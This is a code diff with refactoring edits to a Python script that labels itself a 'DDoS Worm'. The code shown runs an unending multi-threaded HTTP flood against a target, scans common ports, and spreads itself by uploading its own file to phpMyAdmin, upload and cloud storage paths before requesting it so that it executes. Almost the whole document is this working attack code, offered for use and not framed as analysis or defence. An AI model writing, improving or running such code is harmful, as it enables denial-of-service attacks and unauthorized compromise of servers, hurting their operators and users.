@@ -75,11 +75,10 @@ EXPLOIT_PATHS = [
     "/phpmyadmin/",
     "/pma/",
     "/mysql/",
-    # Cloud storage URLs as strings, not paths appended to TARGET_URL
     f"http://{TARGET_IP}/[bucket-name]/",
-    f"http://s3.amazonaws.com/[bucket-name]/",
+    "http://s3.amazonaws.com/[bucket-name]/",
     f"https://[account].blob.core.windows.net/[container]/",
-    f"https://storage.googleapis.com/[bucket-name]/",
+    "https://storage.googleapis.com/[bucket-name]/",
 ]
 
 # --- USER AGENTS ---
@@ -100,7 +99,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 ]
 
-# --- DDoS FLOOD FUNCTION ---
+# --- DDoS HTTP FLOOD ---
 def http_flood():
     while True:
         try:
@@ -126,7 +125,6 @@ def replicate_worm():
                         response = requests.post(upload_url, files=files, timeout=10)
                         if response.status_code in [200, 201, 204]:
                             print(f"[WORM] Successfully replicated to {upload_url}")
-                            # Attempt to execute the worm (if applicable)
                             if not path.startswith("http"):
                                 execute_url = f"{TARGET_URL}{path}{WORM_FILENAME}"
                                 requests.get(execute_url, timeout=5)
@@ -140,8 +138,7 @@ def replicate_worm():
 # --- PORT SCANNER ---
 def scan_ports():
     open_ports = []
-    common_ports = [80, 443, 8080, 8443, 21, 22]
-    for port in common_ports:
+    for port in [80, 443, 8080, 8443, 21, 22]:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
@@ -154,21 +151,19 @@ def scan_ports():
     print(f"[SCAN] Open ports on {TARGET_IP}: {open_ports}")
     return open_ports
 
-# --- MAIN FUNCTION ---
+# --- MAIN ---
 if __name__ == "__main__":
     print(f"[Storm] DDOS Worm Activated. Filename: {WORM_FILENAME}. Target: {TARGET_URL}. The digital apocalypse has begun.")
 
-    # Scan for open ports
+    # Scan open ports
     scan_ports()
 
-    # Start flood threads
+    # Start flooding
     for _ in range(THREADS):
-        thread = threading.Thread(target=http_flood, daemon=True)
-        thread.start()
+        threading.Thread(target=http_flood, daemon=True).start()
 
-    # Start worm replication thread
-    thread = threading.Thread(target=replicate_worm, daemon=True)
-    thread.start()
+    # Start replication
+    threading.Thread(target=replicate_worm, daemon=True).start()
 
     # Keep main thread alive
     while True:
